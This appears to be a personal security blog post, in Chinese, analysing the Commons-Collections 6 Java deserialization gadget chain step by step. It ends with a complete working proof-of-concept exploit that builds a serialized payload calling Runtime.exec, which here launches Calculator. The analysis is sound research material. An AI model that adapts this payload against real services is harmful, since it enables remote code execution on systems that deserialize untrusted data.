@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/atom-one-dark.css">
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>Commons-Collections-6</h1>
+                    <h2 class="subheading">Commons-Collections-6 利用链分析</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on November 6, 2021</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;前一篇分析了CC1的链子，这篇来分析一下针对高版本jdk的CC6，这一条也可以说是比较常用的链子了。</p>
+                	
+                	
+                <h2 class="section-heading">影响范围</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;在Jdk 7和8的⾼版本触发，没有版本限制</p>
+                
+                <h2 class="section-heading">配置环境</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code>    <span class="hljs-tag">&lt;<span class="hljs-title">dependencies</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-title">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-title">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-title">artifactId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-title">version</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-title">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-title">dependencies</span>&gt;</span></code></pre>
+                	
+                </div>
+                
+                
+                
+                <h2 class="section-heading">Commons-Collections-6</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;前面这一部分跟CC1的一样，只不过多了一个Faketransformer，目的是为了在序列化的时候不触发执行。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-11-6/1-1.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;跟随代码来到TiedMapEntry#TiedMapEntry，可以看到这里对this.map赋值为lazyMap类。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-11-6/1-2.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;经过hashSet.add方法后会调用getValue()方法，跟进一下该方法的实现。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-11-6/1-3.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;可以看到这里的map.get(key)，所以上面对this.map赋值其实是为了调用lazyMap类的get方法。
+                	触发lazyMap#get后就跟CC1一样可以执行代码了。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-11-6/1-4.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;那么这里多了一个lazyMap.remove去除前面加入的键值有什么意义么。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-11-6/1-5.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;尝试把lazyMap.remove那一行注释掉就可以发现在lazyMap类的get方法中无法进入if分支，也就无法到factory.transform()来执行指令。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-11-6/1-6.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;先看到实现序列化接口的HashSet类中的readObject方法，这里实例化了HashMap对象，并调用了map.put()方法。
+                	而map.put()方法中的e参数只要可控即可利用。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-11-6/1-7.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;来到序列化的点可以看到这里writeObject方法，e为for循环获取到的key值。
+                	所以把TiedMapEntry对象注入到HashMap的Key值中即可完成利用。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-11-6/1-8.jpg" alt="">
+                </a>
+                
+                
+                
+                <h2 class="section-heading">EXP</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code><span class="hljs-literal">import</span> org.apache.commons.collections.Transformer;
+<span class="hljs-literal">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+<span class="hljs-literal">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+<span class="hljs-literal">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+<span class="hljs-literal">import</span> org.apache.commons.collections.map.LazyMap;
+<span class="hljs-literal">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+
+<span class="hljs-literal">import</span> java.io.*;
+<span class="hljs-literal">import</span> java.lang.reflect.Field;
+<span class="hljs-literal">import</span> java.util.HashMap;
+<span class="hljs-literal">import</span> java.util.HashSet;
+<span class="hljs-literal">import</span> java.util.<span class="hljs-built_in">Map</span>;
+
+public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc1</span> </span>{
+
+    public <span class="hljs-literal">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-built_in">String</span>[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
+
+        Transformer Faketransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{});
+
+        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
+                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>),
+                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>, Class[].<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[]{}}),
+                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]{}}),
+                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>[]{<span class="hljs-string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>})
+        };
+
+        <span class="hljs-built_in">Map</span> map = <span class="hljs-keyword">new</span> HashMap();
+        <span class="hljs-built_in">Map</span> lazyMap = LazyMap.decorate(map, Faketransformer);
+
+        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">"test1"</span>);
+
+        HashSet hashSet = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);
+        hashSet.add(tiedMapEntry);
+        lazyMap.remove(<span class="hljs-string">"test1"</span>);
+
+        <span class="hljs-comment">// 通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span>
+        Field field = ChainedTransformer.<span class="hljs-keyword">class</span>.getDeclaredField(<span class="hljs-string">"iTransformers"</span>);
+        field.setAccessible(<span class="hljs-keyword">true</span>);
+        field.<span class="hljs-literal">set</span>(Faketransformer, transformers);
+
+        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
+        oos.writeObject(hashSet);
+        oos.close();
+
+        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
+        <span class="hljs-built_in">Object</span> o = (<span class="hljs-built_in">Object</span>) ois.readObject();
+        
+    }
+}</code></pre>
+                	
+                </div>	
+
+
+               
+           
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2021</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
